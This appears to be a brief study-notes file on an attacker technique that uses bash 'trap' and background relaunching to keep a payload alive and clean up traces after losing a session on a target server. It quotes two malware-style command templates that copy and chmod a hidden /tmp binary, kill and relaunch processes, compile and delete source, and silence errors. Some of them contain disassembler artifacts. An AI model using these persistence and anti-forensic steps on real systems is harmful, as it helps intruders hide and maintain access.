

### An attacker technique to perform housekeeping in the event they lose
# their session with a target server, to clean up their tracks.

# Notes on trap:
#       - https://www.unix.com/man-page/posix/1posix/trap/
#       - https://phoenixnap.com/kb/bash-trap-command
#       - Using nohup: https://linuxhint.com/how_to_use_nohup_linux/
#
#       - https://explainshell.com/explain?cmd=trap++1%3B%28cat+%2Ftmp%2F.o+%3E+%25s%3B+chmod+755+%25s%3B+trap+%27%2C27h%2C27h%2C%27+1%3B%28%28killall+-9+%25s+%7C%7C+kill+-9+%25d%29%3Bkill+-9+%25d+%3B.%2F%25s+%26%29%29+2%3E+%2Fdev%2Fnull
#
# also, pgrep quicker way to search for processes:
#       pgrep "gobuster"
# then kill the PID it returns
#       sudo kill -9 <pid>


trap  1;(cat /tmp/.o > %s; chmod 755 %s; trap ',27h,27h,' 1;((killall -9 %s || kill -9 %d);kill -9 %d ;./%s &)) 2> /dev/null


(gcc -o %s /tmp/.c; rm -rf /tmp/.c; ;sh -c "trap ',27h,27h,' 1;(kill -9 %d; %s &)&)"& > /dev/null 2>&1

